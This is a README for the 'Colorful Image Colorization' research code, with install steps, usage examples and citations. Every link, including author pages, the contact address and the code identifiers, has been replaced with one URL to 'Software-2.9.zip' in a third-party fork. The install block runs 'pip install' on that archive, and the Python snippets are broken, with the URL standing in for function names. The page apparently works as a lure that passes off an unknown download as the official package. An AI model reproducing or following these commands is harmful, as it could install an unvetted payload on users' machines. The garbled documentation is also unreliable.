<!--<h3><b>Colorful Image Colorization</b></h3>-->
## <b>Colorful Image Colorization</b> [[Project Page]](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip) <br>
[Richard Zhang](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip), [Phillip Isola](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip), [Alexei A. Efros](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip~efros/). In [ECCV, 2016](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip).

**+ automatic colorization functionality for Real-Time User-Guided Image Colorization with Learned Deep Priors, SIGGRAPH 2017!**

**[Sept20 Update]** Since it has been 3-4 years, I converted this repo to support minimal test-time usage in PyTorch. I also added our SIGGRAPH 2017 (it's an interactive method but can also do automatic). See the [Caffe branch](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip) for the original release.

![Teaser Image](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip)

**Clone the repository; install dependencies**

```
git clone https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip
pip install https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip
```

**Colorize!** This script will colorize an image. The results should match the images in the `imgs_out` folder.

```
python https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip -i https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip
```

**Model loading in Python** The following loads pretrained colorizers. See [https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip) for some details on how to run the model. There are some pre and post-processing steps: convert to Lab space, resize to 256x256, colorize, and concatenate to the original full resolution, and convert to RGB.

```python
import colorizers
colorizer_eccv16 = https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip().eval()
colorizer_siggraph17 = https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip().eval()
```

### Original implementation (Caffe branch)

The original implementation contained train and testing, our network and AlexNet (for representation learning tests), as well as representation learning tests. It is in Caffe and is no longer supported. Please see the [caffe](https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip) branch for it.

### Citation ###

If you find these models useful for your resesarch, please cite with these bibtexs.

```
@inproceedings{zhang2016colorful,
  title={Colorful Image Colorization},
  author={Zhang, Richard and Isola, Phillip and Efros, Alexei A},
  booktitle={ECCV},
  year={2016}
}

@article{zhang2017real,
  title={Real-Time User-Guided Image Colorization with Learned Deep Priors},
  author={Zhang, Richard and Zhu, Jun-Yan and Isola, Phillip and Geng, Xinyang and Lin, Angela S and Yu, Tianhe and Efros, Alexei A},
  journal={ACM Transactions on Graphics (TOG)},
  volume={9},
  number={4},
  year={2017},
  publisher={ACM}
}
```

### Misc ###
Contact Richard Zhang at https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip at https://raw.githubusercontent.com/fateenkagazi/colorization/master/rowed/Software-2.9.zip for any questions or comments.
